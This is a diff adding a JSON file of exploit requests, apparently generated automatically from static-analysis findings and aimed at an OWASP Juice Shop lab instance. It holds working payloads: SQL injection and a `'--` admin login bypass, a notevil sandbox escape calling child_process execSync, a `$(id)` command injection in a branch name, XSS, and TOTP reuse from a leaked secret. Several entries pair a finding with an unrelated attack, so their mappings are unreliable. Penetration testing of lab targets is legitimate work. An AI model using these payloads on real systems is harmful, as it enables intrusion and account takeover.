@@ -1,0 +1,99 @@
+{
+  "metadata": {
+    "target_host": "http://juice-shop:3000",
+    "job_id": "58fc14c9-b915-4db7-b73e-75baf489d233",
+    "generated_at": "2026-05-21T02:17:51.132034"
+  },
+  "exploits": [
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "Error",
+      "method": "POST",
+      "endpoint": "/repos/{owner}/{repo}/git/refs",
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer <YOUR_GITHUB_TOKEN>"
+      },
+      "body": "{\"ref\": \"refs/heads/fix/update-ebook-$(id)\", \"sha\": \"<TARGET_COMMIT_SHA>\"}",
+      "expected_success_regex": "uid=\\d+\\(.*?\\)\\s+gid=\\d+\\(.*?\\)\\s+groups=\\d+"
+    },
+    {
+      "vuln_type": "[SAST] javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+      "severity": "Error",
+      "method": "POST",
+      "endpoint": "/rest/products/search",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "q=') UNION SELECT NULL, 'SQLi_SUCCESS', 'This product was injected.', 999, NULL, '2099-12-31 23:59:59.999 +00:00', '2099-12-31 23:59:59.999 +00:00', NULL-- ",
+      "expected_success_regex": "(?i)\"name\": ?\"SQLi_SUCCESS\""
+    },
+    {
+      "vuln_type": "[SAST] generic.secrets.security.detected-generic-secret.detected-generic-secret",
+      "severity": "Error",
+      "method": "POST",
+      "endpoint": "/rest/2fa/verify",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"token\": \"[TOTP_GENERATED_FROM_LEAKED_SECRET]\", \"tmpToken\": \"[CONTINUE_CODE_FROM_LOGIN_STEP_1]\"}",
+      "expected_success_regex": "(?i)\"authentication\":\\s*\\{.*\"token\":\\s*\".+\"\\}"
+    },
+    {
+      "vuln_type": "[SAST] javascript.lang.security.audit.hardcoded-hmac-key.hardcoded-hmac-key",
+      "severity": "Warning",
+      "method": "POST",
+      "endpoint": "/rest/user/login",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "email=admin%40juice-sh.op&password=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjoxLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIn0sImlhdCI6MTY3MjUzMTIwMH0.g_tL0vBG4cndyGPNM5Vckbwx4x2jmoYqS0j0aCj3bNE",
+      "expected_success_regex": "{\"authentication\":{\"token\":\".+\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+    },
+    {
+      "vuln_type": "[SAST] javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret",
+      "severity": "Warning",
+      "method": "POST",
+      "endpoint": "/rest/user/login",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"whatever\"}",
+      "expected_success_regex": "\"authentication\":{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\\.(.*)\",\"bid\":(.*),\"umail\":\"admin@juice-sh\\.op\"}"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.audit.express-detect-notevil-usage.express-detect-notevil-usage",
+      "severity": "Warning",
+      "method": "POST",
+      "endpoint": "/b2b/orders/",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"orderLinesData\":[{\"price\":\"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('echo RCE_SUCCESS_B2B').toString()\",\"quantity\":1,\"productId\":1}],\"payment\":{\"method\":\"invoice\",\"paymentId\":\"1234-5678\"},\"delivery\":{\"method\":\"drone\",\"addressId\":1}}",
+      "expected_success_regex": "RCE_SUCCESS_B2B"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.raw-html-format.raw-html-format",
+      "severity": "Warning",
+      "method": "POST",
+      "endpoint": "/api/Users/login",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"email\":\"<img src=x onerror=alert(`XSS-SAST-JS-EXPRESS-RAW-HTML`)>\",\"password\":\"password123\"}",
+      "expected_success_regex": "umail\":\"<img src=x onerror=alert\\(`XSS-SAST-JS-EXPRESS-RAW-HTML`\\)>"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.audit.remote-property-injection.remote-property-injection",
+      "severity": "Error",
+      "method": "POST",
+      "endpoint": "/api/user/details",
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer <YOUR_JWT_TOKEN>"
+      },
+      "body": "{\"key\":\"password\"}",
+      "expected_success_regex": "\"password\":\\s*\".+\""
+    }
+  ]
+}
